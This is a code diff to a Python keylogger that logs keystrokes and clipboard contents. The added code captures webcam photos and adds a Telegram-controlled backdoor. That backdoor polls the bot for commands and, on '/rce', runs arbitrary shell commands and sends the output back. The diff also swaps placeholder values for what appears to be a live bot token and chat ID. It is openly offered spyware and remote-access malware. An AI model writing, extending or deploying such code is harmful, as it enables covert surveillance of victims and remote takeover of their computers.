@@ -5,17 +5,13 @@ import io
 import requests
 from pynput import keyboard
 import pyperclip
+import cv2
+import time
+import mss
+from PIL import Image
 
-try:
-    import mss
-    from PIL import Image
-except ImportError:
-    subprocess.check_call(['pip', 'install', 'mss', 'pillow'])
-    import mss
-    from PIL import Image
-
-bot_token = 'YOUR_BOT_TOKEN' #Telegram
-chat_id = 'YOUR_CHAT_ID'     #Telegram
+bot_token = '7762380331:AAEDulbHavLQ03z4k-QVBZbKcPbde5OpPKs' 
+chat_id = '1929750150' 
 loggedKeys = []
 last_clipboard = ""
 
@@ -29,7 +25,7 @@ specialKeys = {
     "alt": "[ALT]",
     "esc": "[ESC]",
     "caps_lock": "[CAPS]",
-    "cmd": "[CMD]",
+    "cmd": "[WIN]",
     "delete": "[DEL]",
     "up": "↑",
     "down": "↓",
@@ -99,10 +95,47 @@ def on_press(key):
         name = str(key).split('.')[-1]
         loggedKeys.append(specialKeys.get(name, f"[{name.upper()}]"))
 
+def capture_and_send(bot_token, chat_id):
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cap.release()
 
-# Start everything
+    Success, img_bytes = cv2.imencode('.jpg', frame)
+
+    requests.post(
+        f"https://api.telegram.org/bot{bot_token}/sendPhoto",
+        files={"photo": ("image.jpg", io.BytesIO(img_bytes.tobytes()), "image/jpeg")},
+        data={"chat_id": chat_id}
+    )
+
+def botCommand():
+    tmp = 0
+    getCommandUpdatesUrl = "https://api.telegram.org/bot7762380331:AAEDulbHavLQ03z4k-QVBZbKcPbde5OpPKs/getUpdates"
+    while True:
+        contents = requests.get(getCommandUpdatesUrl).json()
+        cmd = contents["result"][-1]["message"]["text"]
+        id = contents["result"][-1]["message"]["message_id"]
+        if cmd == "/camera" and id > tmp:
+            capture_and_send(bot_token, chat_id)
+        if "/rce" in cmd and id > tmp:
+            runCommand(cmd.split()[1:])
+        tmp = id
+        time.sleep(5)
+
+threading.Thread(target=botCommand, daemon=True).start()
+
+def runCommand(cmd):
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    requests.post(
+    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+    data={"chat_id": chat_id, "text": result.stdout if result.stdout else result.stderr}
+)
+
 periodic_task()
+
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 
-     
+
+
+
